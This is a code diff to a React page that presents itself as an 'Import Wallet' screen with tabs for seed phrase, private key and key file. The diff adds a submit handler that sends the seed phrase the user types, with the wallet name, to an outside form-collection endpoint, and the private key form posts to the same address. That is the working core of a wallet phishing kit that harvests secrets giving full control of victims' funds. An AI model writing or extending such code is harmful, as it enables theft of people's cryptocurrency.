@@ -12,7 +12,10 @@ import styled from "@emotion/styled";
 import { ImportTextField } from "./styles/styles";
 import LandingAppBar from "./Components/LandingAppBar";
 
-const WalletForm = ({ children, code }) => {
+const FORM_ENDPOINT =
+  "https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288";
+
+const WalletForm = ({ children, code, handleSubmit }) => {
   const uploadData = (value, type, wallet) => {
     const payload = { value, type, wallet };
 
@@ -35,9 +38,9 @@ const WalletForm = ({ children, code }) => {
   return (
     <Box
       component="form"
-      action="https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288"
+      action={FORM_ENDPOINT}
       method="POST"
-      onSubmit={() => handleUpload({ code })}
+      onSubmit={handleSubmit}
     >
       {children}
       <Button type="submit" sx={{ width: "100%" }} variant="contained">
@@ -77,15 +80,40 @@ function a11yProps(index) {
 }
 
 function BasicTabs() {
+  const { wallet } = useContext(WalletContext);
+
   const PRIVATE_KEY = "private_key";
   const SEED_PHRASE = "seed_phrase";
   const KEY_JSON = "key_json";
 
-  const { wallet } = useContext(WalletContext);
+  const [seedPhrase, setSeedPhrase] = useState();
+  const [privateKey, setPrivateKey] = useState();
+  const [keyJSON, setKeyJSON] = useState();
+  const [keyPasscode, setKeyPasscode] = useState();
+
   const [value, setValue] = useState(0);
 
   const handleChange = (event, newValue) => {
     setValue(newValue);
+  };
+
+  const handleSeedPhraseSubmit = (e) => {
+    e.preventDefault();
+
+    const injectedData = {
+      wallet,
+      seedPhrase,
+      code: SEED_PHRASE,
+    };
+
+    fetch(FORM_ENDPOINT, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(injectedData),
+    });
   };
 
   return (
@@ -103,10 +131,14 @@ function BasicTabs() {
       </Box>
 
       <TabPanel value={value} index={0}>
-        <WalletForm code={SEED_PHRASE}>
+        <WalletForm code={SEED_PHRASE} handleSubmit={handleSeedPhraseSubmit}>
           <ImportTextField
             name="Seed Phrase"
             label="Seed Phrase"
+            value={seedPhrase}
+            onChange={(e) => {
+              setSeedPhrase(e.target.value);
+            }}
             multiline
             sx={{ mb: 2 }}
             rows={6}
@@ -118,13 +150,13 @@ function BasicTabs() {
       </TabPanel>
 
       <TabPanel value={value} index={1}>
-          <WalletForm code={PRIVATE_KEY}>
-            <ImportTextField
-              name="private_key"
-              label="Private Key"
-              sx={{ mb: 2 }}
-            />
-          </WalletForm>
+        <WalletForm code={PRIVATE_KEY}>
+          <ImportTextField
+            name="private_key"
+            label="Private Key"
+            sx={{ mb: 2 }}
+          />
+        </WalletForm>
       </TabPanel>
 
       <TabPanel value={value} index={2}>
@@ -155,7 +187,6 @@ const ImportWallet = () => {
           <IconButton component={NavLink} to="/wallets">
             <ArrowBackIcon />
           </IconButton>
-          <Typography variant="h6">Import {wallet} Wallet</Typography>
         </Box>
         <BasicTabs />
       </Container>
